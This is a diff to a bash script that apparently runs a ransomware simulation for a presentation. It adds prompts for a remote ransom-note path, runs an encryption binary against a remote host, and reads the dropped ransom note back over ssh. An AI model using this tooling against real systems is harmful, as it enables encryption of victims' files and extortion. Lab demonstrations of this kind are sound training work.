@@ -88,6 +88,7 @@ LOCAL_OUT=false
 DROP_NOTE=false
 NOTE_TMPL="press"
 NOTE_OUT=""
+REMOTE_NOTE_PATH=""
 
 if [[ "$ACTION" != "decrypt" ]]; then
   read -rp "Treat INPUT as local and move it to remote? (--local-in) [y/N]: " ans
@@ -103,7 +104,13 @@ if [[ "$ACTION" != "decrypt" ]]; then
     DROP_NOTE=true
     read -rp "Note template [generic/polite/press] (press): " NOTE_TMPL
     NOTE_TMPL="${NOTE_TMPL:-press}"
-    read -rp "Custom note output path (default next to output file): " NOTE_OUT || true
+
+    # Derive a sensible default remote note path next to the output file.
+    REMOTE_NOTE_DIR="$(dirname "$OUTPUT_PATH")"
+    read -rp "Remote note path [$REMOTE_NOTE_DIR/NOTE.txt]: " REMOTE_NOTE_PATH
+    REMOTE_NOTE_PATH="${REMOTE_NOTE_PATH:-$REMOTE_NOTE_DIR/NOTE.txt}"
+
+    read -rp "Custom local note output path (default next to output file): " NOTE_OUT || true
   fi
 fi
 
@@ -132,9 +139,25 @@ read -rp "Execute now? [y/N]: " CONFIRM
 
 # ---------- execute ----------
 info "Running simulation on $REMOTE_HOST ..."
-"$KEY_BIN" "${CMD[@]}"
+OUTPUT=$("$KEY_BIN" "${CMD[@]}" 2>&1) || {
+  printf '%s\n' "$OUTPUT"
+  fail "remote encryption failed"
+}
+printf '%s\n' "$OUTPUT"
 
-ok "Simulation complete."
+ok "Remote encryption succeeded."
+
+# ---------- cat remote ransom note if one was dropped ----------
+if $DROP_NOTE; then
+  echo
+  info "Remote ransom note (cat'd from $REMOTE_HOST:$REMOTE_NOTE_PATH):"
+  NOTE_OUTPUT=$(ssh "$REMOTE_HOST" "cat '$REMOTE_NOTE_PATH'" 2>&1) || {
+    warn "Could not read remote note at $REMOTE_NOTE_PATH"
+  }
+  printf '%s\n' "$NOTE_OUTPUT"
+fi
+
 echo
+ok "Simulation complete."
 info "Restore normal SSH after presentation (if lab config was applied):"
 info "  cp ~/.ssh/config.bak ~/.ssh/config"
